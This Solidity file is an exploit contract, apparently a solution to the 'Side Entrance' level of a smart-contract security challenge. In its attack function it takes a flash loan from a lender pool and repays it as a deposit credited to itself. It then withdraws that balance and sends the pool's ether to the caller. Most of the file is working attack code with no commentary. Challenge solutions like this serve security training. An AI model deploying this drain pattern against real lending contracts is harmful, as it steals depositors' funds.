// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

/**
 * @title AttackSideEntrance
 * @author zishansami102

 */
contract AttackSideEntrance {
    SideEntranceLenderPool public flashLoan;
    uint256 loanAmount;

    constructor(address _flashLoan) {
        flashLoan = SideEntranceLenderPool(_flashLoan);
    }

    function attack(uint256 _loanAmount) external {
        loanAmount = _loanAmount;
        flashLoan.flashLoan(loanAmount);
        flashLoan.withdraw();
        payable(msg.sender).call{value:address(this).balance}("");
    }

    function execute() external payable {
        flashLoan.deposit{value: loanAmount}();
    }

    receive() external payable {}
}
